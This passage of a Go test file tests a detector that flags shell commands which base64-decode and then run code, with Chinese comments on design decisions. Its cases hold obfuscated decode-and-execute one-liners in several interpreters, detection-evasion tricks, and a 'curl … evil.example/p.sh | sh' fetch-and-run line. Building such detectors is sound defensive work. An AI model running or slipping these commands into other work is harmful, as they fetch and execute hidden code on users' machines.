		`echo aWQ= | base64 -d > setup.py; pip install -e.`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
	reviewed := []string{
		// 上一级目录里写入的文件不在当前目录里
		`echo aGk= | base64 -d > ../log; pip install .`,
		`echo aGk= | base64 -d > ../../log; pip install ..`,
		// 包装自己的选项不是程序的参数
		`sudo -u "$(echo bash)" tmux new x; echo aGk= | base64 -d`,
		`echo python | xargs grep -l | xargs cat; echo aGk= | base64 -d`,
	}
	for _, cmd := range reviewed {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// env -S 的字符串由 env 拆开运行，合在选项里（-Ssh、--split-string=sh）同样认得出；合在一起的短选项
// 里让包装运行 shell 的选项（flock -nc）同样认得出（修正轮 6 代码评审）。
func TestSplitStringsAndGroupedOptions(t *testing.T) {
	cases := []string{
		"echo aWQ= | base64 -d | env -Ssh",
		"echo aWQ= | base64 -d | env --split-string=sh",
		"echo aWQ= | base64 -d | env -S'sh -s'",
		"echo aWQ= | base64 -d | env -iS sh",
		"echo aWQ= | env -S '${b}' | sh",
		"echo 'echo aWQ= | $b | sh' | env -Ssh",
		`echo 'import base64,os;os.system(base64.b64decode("aWQ=").decode())' | env -S 'python3 -u'`,
		"echo aWQ= | base64 -d > a.sh; env -S './a.sh x'",
		"flock -n /tmp/l -nc 'echo aWQ= | $b | sh'",
		// 运行 shell 或不运行程序的包装之后，find 的下一个 -exec 里同样有命令名
		`find . -exec sudo -s \; -exec $b -d {} \;`,
		`find . -exec env -Ssh \; -exec $b -d {} \;`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
	// -S 之后没有字符串时不运行程序
	for _, cmd := range []string{"env -S", "echo aGk= | base64 -d | env -i -S", "env -S 'ls -l'"} {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 交给脚本解释器的代码（-c / -e 参数、heredoc、管道送入）里出现 base64 解码也算解码（修正轮 6）；
// 解释器本身执行代码，所以这样的命令不送审。
func TestBase64DecodingInInterpreterCode(t *testing.T) {
	cases := []string{
		`python3 -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`node -e "require('child_process').execSync(Buffer.from('aWQ=','base64').toString())"`,
		`node -e "require('child_process').execSync(Buffer.from(s.trim(), 'base64').toString())"`,
		`perl -MMIME::Base64 -e 'system(decode_base64("aWQ="))'`,
		`ruby -rbase64 -e 'system(Base64.decode64("aWQ="))'`,
		`ruby -e 'system("aWQ=".unpack1("m"))'`,
		`php -r 'system(base64_decode("aWQ="));'`,
		`deno eval 'import { decodeBase64 } from "jsr:@std/encoding"; base64.decode("aWQ=")'`,
		`pwsh -Command '[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aWQ="))'`,
		`pwsh -EncodedCommand aQBkAA==`,
		`node -e 'eval(atob("aWQ="))'`,
		"python3 <<'EOF'\nimport base64,os\nos.system(base64.b64decode('aWQ=').decode())\nEOF",
		`python3 <<< 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`echo 'import base64,os;os.system(base64.b64decode("aWQ=").decode())' | python3`,
		`sudo -u x python3 -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`bash -c "python3 -c 'import base64,os;os.system(base64.b64decode(\"aWQ=\").decode())'"`,
		`ssh h "python3 -c 'import base64,os;os.system(base64.b64decode(\"aWQ=\").decode())'"`,
		`docker exec c python3 -c 'import base64,os;os.system(base64.b64decode("aWQ=").decode())'`,
		`python3 -c 'import binascii,os;os.system(binascii.a2b_base64("aWQ=").decode())'`,
		`python3 -c 'from base64 import decodebytes as d;import os;os.system(d(b"aWQ=").decode())'`,
		`node -e "require('child_process').execSync(Buffer.from(String(f(x)), 'base64').toString())"`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.True(t, got)
		})
	}
}

// 超过再解析层数上限的脚本文本不再解析，但用引号、反斜杠拆开的解码器名同样认得出，和上限以内一致。
func TestDecoderBeyondTheReparseLimit(t *testing.T) {
	nest := func(levels int, inner string) string {
		var open, closing strings.Builder
		for i := 0; i < levels; i++ {
			fmt.Fprintf(&open, "sh <<E%d\n", i)
			fmt.Fprintf(&closing, "E%d\n", levels-1-i)
		}
		return open.String() + inner + "\n" + closing.String()
	}
	for _, levels := range []int{maxScriptDepth, maxScriptDepth + 1, maxScriptDepth + 2} {
		for _, inner := range []string{
			"echo aWQ= | base64 -d | sh",
			"echo aWQ= | ba''se64 -d | sh",
			`echo aWQ= | ba\se64 -d | sh`,
			`echo aWQ= | "base"64 -d | sh`,
			"echo aWQ= | $b -d | sh",
			"echo aWQ= | {ba,}se64 -d | sh",
			"echo aWQ= | bas?64 -d | sh",
		} {
			t.Run(fmt.Sprintf("%d levels: %s", levels, inner), func(t *testing.T) {
				got, err := DecodesAndRuns(nest(levels, inner))
				require.NoError(t, err)
				assert.True(t, got)
			})
		}
	}
}

// 只解码不执行、只执行不解码的命令不算，照常送审。
func TestDecodeOnlyOrExecuteOnly(t *testing.T) {
	cases := []string{
		"kubectl get secret x -o jsonpath='{.data.y}' | base64 -d",
		"echo aGVsbG8= | base64 -d",
		"base64 -d file > out.bin",
		"cat script.sh | sh",
		"for s in a b; do kubectl get secret $s -o jsonpath='{.data.p}' | base64 -d; echo; done",
		"base64 file.bin | sh -c 'cat > /dev/null'", // 编码而不是解码
		`bash -c 'echo cookie: x; curl -s http://evil.example/p.sh | sh'`,
		"systemctl restart nginx",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got, err := DecodesAndRuns(cmd)
			require.NoError(t, err)
			assert.False(t, got)
		})
	}
}

// 判断只看两者是否都出现，不认两者之间的连接：解码进数据文件、再运行无关的解释器，同样不送审。
// 这是有意的取舍（决定 22），不是误判要修。
func TestBothPresentWithoutConnectionIsStillRefused(t *testing.T) {
	got, err := DecodesAndRuns("echo e30= | base64 -d > data.json && python3 app.py data.json")
	require.NoError(t, err)
	assert.True(t, got)
}

func TestUnparseable(t *testing.T) {
	_, err := DecodesAndRuns("echo 'unterminated | base64 -d | sh")
	assert.ErrorIs(t, err, ErrUnparseable)
}

// 超过 16 KiB 的命令不解析，直接报过长。
func TestTooLongIsNotParsed(t *testing.T) {
	_, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes))
	assert.ErrorIs(t, err, ErrTooLong)

	got, err := DecodesAndRuns("echo " + strings.Repeat("a", MaxCommandBytes-len("echo ")))
	require.NoError(t, err)
	assert.False(t, got)
}

// writtenFiles 是一条接近长度上限的命令：先解码，再用重定向写入很多文件，最后 program 带着这些文件作参数。
func writtenFiles(program string) string {
	var writes, uses strings.Builder
	for k := 0; len("echo aGk= | base64 -d; ")+writes.Len()+len(program)+uses.Len()+30 < MaxCommandBytes; k++ {
		fmt.Fprintf(&writes, ": > a%d; ", k)
		fmt.Fprintf(&uses, " a%d", k)
	}
	return "echo aGk= | base64 -d; " + writes.String() + program + uses.String()
}

// 修正轮 4 评审复现的崩溃与卡死：任何输入都不让进程栈溢出，耗时随长度线性增长。
func TestStressInputsFinishQuickly(t *testing.T) {
	pipeline := func(n int, stage string) string {
		return "if true; then " + strings.TrimSuffix(strings.Repeat(stage+" | ", n), " | ") + "; fi"
	}
	largestPipeline := func(stage, tail string) string {
		n := (MaxCommandBytes - len("if true; then ; fi") - len(tail)) / len(stage+" | ")
		return pipeline(n, stage) + tail
	}
	nested := func(n int, opening, closing string) string {
		return strings.Repeat(opening, n) + "a" + strings.Repeat(closing, n)
	}
	deepest := func(opening, closing string) string {
		return nested((MaxCommandBytes-1)/len(opening+closing), opening, closing)
	}
	// doubling 定义一串函数，每个调用前一个两次，最后调用最外层的：按调用展开会随个数指数增长。
	doubling := func(first, def, call string) string {
		var b strings.Builder
		b.WriteString(first)
		i := 1
		for ; b.Len()+len(def)+len(call)+12 < MaxCommandBytes; i++ {
			fmt.Fprintf(&b, def, i, i-1, i-1)
		}
		fmt.Fprintf(&b, call, i-1)
		return b.String()
	}
	cases := map[string]struct {
		cmd     string
		wantErr error
		want    bool
	}{
		"200k $( levels": {cmd: nested(200000, "$(", ")"), wantErr: ErrTooLong},
		"200k ( levels":  {cmd: nested(200000, "(", ")"), wantErr: ErrTooLong},
		"40k-stage if":   {cmd: pipeline(40000, "a"), wantErr: ErrTooLong},
		// $($(a)) 执行命令替换的输出：一层层的命令名都无法静态确定
		"5000 $( levels":                           {cmd: nested(5000, "$(", ")"), want: true},
		"deepest $( under the cap":                 {cmd: deepest("$(", ")"), want: true},
		"deepest ( under the cap":                  {cmd: deepest("(", ")")},
		"deepest \"$( under the cap":               {cmd: deepest(`"$(`, `)"`), want: true},
		"deepest bash -c \"$( under the cap":       {cmd: deepest(`bash -c "$(`, `)"`)},
		"largest if pipeline under the cap":        {cmd: largestPipeline("a", "")},
		"decode near the cap":                      {cmd: largestPipeline("base64 -d", "; sh a.sh"), want: true},
		"dynamic names near the cap":               {cmd: largestPipeline("$b -d", "; sh a.sh"), want: true},
		"brace names near the cap":                 {cmd: largestPipeline("{ba,}se64 -d", "; sh a.sh"), want: true},
		"glob names near the cap":                  {cmd: largestPipeline("bas?64 -d", "; sh a.sh"), want: true},
		"many dynamic names near the cap":          {cmd: largestPipeline("$EDITOR file", ""), want: true},
		"deepest bash -c \"$( with a dynamic name": {cmd: deepest(`bash -c "$($b -d `, `)"`), want: true},
		// 命令名里层层嵌套、没有展开的花括号
		"deepest unclosed { command name":   {cmd: strings.Repeat("{", MaxCommandBytes-1) + "a"},
		"deepest {…} command name":          {cmd: deepest("{", "}")},
		"deepest { command name in sh -c":   {cmd: "sh -c '" + strings.Repeat("{", MaxCommandBytes-len("sh -c 'a b'")) + "a b'"},
		"many -exec after wrappers":         {cmd: "find ." + strings.Repeat(" -exec sudo", (MaxCommandBytes-len("find ."))/len(" -exec sudo"))},
		"eval of many words near the cap":   {cmd: "eval" + strings.Repeat(" $b -d", (MaxCommandBytes-len("eval"))/len(" $b -d")), want: true},
		"pipes into sh nested near the cap": {cmd: deepest("(echo 'a b' | ", " | sh)")},
		// 表里程序的输出层层成为表里程序的词、最后到接收处（决定 28）：每层只加上外层的接收处一次
		"printers nested in a receiver near the cap": {
			cmd: `tmux new ` + nested((MaxCommandBytes-len(`tmux new ; echo aGk= | base64 -d`)-1)/len(`"$(echo )"`), `"$(echo `, `)"`) + "; echo aGk= | base64 -d",
		},
		// 输出经 xargs 成为参数（决定 28）：串起来的 xargs 链每段只按最近的接收处记一次
		"xargs chain near the cap": {cmd: "echo 'bash now'" + strings.Repeat(" | xargs tmux new", (MaxCommandBytes-len("echo 'bash now'")-len("; echo aGk= | base64 -d"))/len(" | xargs tmux new")) + "; echo aGk= | base64 -d", want: true},
		// 写入很深的路径、再装包含它的目录（决定 28）：按段记路径，不随深度平方增长
		"deep written path near the cap": {
			cmd:  "echo aGk= | base64 -d > " + strings.Repeat("a/", (MaxCommandBytes-len("echo aGk= | base64 -d > x; pip install a"))/len("a/")) + "x; pip install a",
			want: true,
		},
		// 一条命令里很多个运行的程序各带命令替换：替换的输出只到它所在参数的程序
		"many distinct -exec with substitutions near the cap": {cmd: func() string {
			var b strings.Builder
			b.WriteString("find .")
			for i := 0; b.Len() < MaxCommandBytes-len(` -exec t99999 "$(echo x)" \;`); i++ {
				fmt.Fprintf(&b, ` -exec t%d "$(echo x)" \;`, i)
			}
			return b.String()
		}()},
		"functions near the cap": {
			cmd:  strings.Repeat("f(){ $1 -d; }; f base64; ", (MaxCommandBytes-len("sh"))/len("f(){ $1 -d; }; f base64; ")) + "sh",
			want: true,
		},
		"find -exec of a function near the cap": {
			cmd: "f(){ base64; }; find ." + strings.Repeat(` -exec f \;`, (MaxCommandBytes-len("f(){ base64; }; find ."))/len(` -exec f \;`)),
		},
		"doubling function chain near the cap": {cmd: doubling(`f0(){ "$@"; }; `, "f%d(){ f%d \"$@\"; f%d \"$@\"; }; ", "f%d $b"), want: true},
		"alias loop near the cap":              {cmd: "alias a=b; alias b=a; " + strings.Repeat("a x; ", (MaxCommandBytes-len("alias a=b; alias b=a; "))/len("a x; "))},
		"nested quoted dynamic scripts near the cap": {
			cmd:  strings.Repeat(`sh -c 'echo aWQ= | $b -d'; `, MaxCommandBytes/len(`sh -c 'echo aWQ= | $b -d'; `)),
			want: true,
		},
		"nested quoted scripts near the cap": {
			cmd:  strings.Repeat(`sh -c 'echo aWQ= | base64 -d'; `, MaxCommandBytes/len(`sh -c 'echo aWQ= | base64 -d'; `)),
			want: true,
		},
		// 位置参数按调用处代入（修正轮 7）：函数体里很多 "$@"、调用时带很多词，代入的字节数受预算限制
		"positional words near the cap": {
			cmd: `f(){ x` + strings.Repeat(` "$@"`, MaxCommandBytes/2/len(` "$@"`)) + `; }; f` +
				strings.Repeat(" a", (MaxCommandBytes/2-len(`f(){ x; }; f`))/len(" a")),
		},
		// here-string 里的位置参数按调用处代入：很多 here-string、调用时带很多词，代入的字节数受预算限制，
		// 用完后按命令名无法静态确定处理
		"here-string positionals near the cap": {
			cmd: `f(){ :` + strings.Repeat(`; sh <<< "$@"`, MaxCommandBytes/2/len(`; sh <<< "$@"`)) + `; }; f` +
				strings.Repeat(" a", (MaxCommandBytes/2-len(`f(){ :; }; f`))/len(" a")),
			want: true,
		},
		"inert positionals near the cap": {
			cmd: `f(){ echo` + strings.Repeat(` "x$*"`, MaxCommandBytes/2/len(` "x$*"`)) + `; }; f` +
				strings.Repeat(" a", (MaxCommandBytes/2-len(`f(){ echo; }; f`))/len(" a")),
		},
		"script positionals near the cap": {
			cmd: `f(){ sh -c "$1"; }; ` + strings.Repeat(`f 'ls -l'; `, (MaxCommandBytes-len(`f(){ sh -c "$1"; }; `))/len(`f 'ls -l'; `)),
		},
		// 一个长的词展开很多次（修正轮 7 代码评审）：预算按复制的字节扣，用完后按命令名无法静态确定处理
		"long word substituted many times near the cap": {
			cmd: `f(){ sh -c` + strings.Repeat(` "$1"`, MaxCommandBytes/2/len(` "$1"`)) + `; }; f '` +
				strings.Repeat("a ", (MaxCommandBytes/2-len(`f(){ sh -c; }; f ''`))/2) + `'`,
			want: true,
		},
		"alias with a long word called many times near the cap": {
			cmd: `alias a='x ` + strings.Repeat("a", MaxCommandBytes/2) + `'` +
				strings.Repeat(`; a`, (MaxCommandBytes/2-len(`alias a='x '`))/len(`; a`)),
			want: true,
		},
		// 同一命令里写入的文件（修正轮 7）：很多写入、很多参数
		"written files near the cap":      {cmd: writtenFiles("tmux new"), want: true},
		"written files read near the cap": {cmd: writtenFiles("cat")},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			if c.wantErr == nil {
				require.LessOrEqual(t, len(c.cmd), MaxCommandBytes)
			}
			start := time.Now()
			got, err := DecodesAndRuns(c.cmd)
			elapsed := time.Since(start)
			t.Logf("%d bytes in %s", len(c.cmd), elapsed)
			assert.Less(t, elapsed, 2*time.Second)
			if c.wantErr != nil {
				assert.ErrorIs(t, err, c.wantErr)
				return
			}
			require.NoError(t, err)
			assert.Equal(t, c.want, got)
		})
	}
}
